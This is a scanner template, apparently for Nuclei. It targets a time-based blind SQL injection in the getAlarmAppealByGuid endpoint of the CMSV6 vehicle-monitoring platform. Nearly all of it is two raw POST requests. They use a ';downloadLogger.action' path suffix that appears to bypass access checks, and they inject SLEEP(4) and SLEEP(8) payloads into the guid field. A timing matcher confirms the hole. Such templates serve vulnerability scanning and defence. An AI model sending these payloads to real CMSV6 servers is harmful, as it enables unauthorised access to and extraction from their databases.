id: 808gps-getAlarmAppealByGuid-sqli

info:
  name: 通天星-CMSV6-SQL注入-getAlarmAppealByGuid
  author: HuanXiong
  severity: high
  tags: SQL Injection

http:
  - raw:
      - |
        POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Encoding: gzip, deflate

        guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(4)))PITq) AND ('qhqF'='qhqF

      - |
        POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Encoding: gzip, deflate

        guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(8)))PITq) AND ('qhqF'='qhqF

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"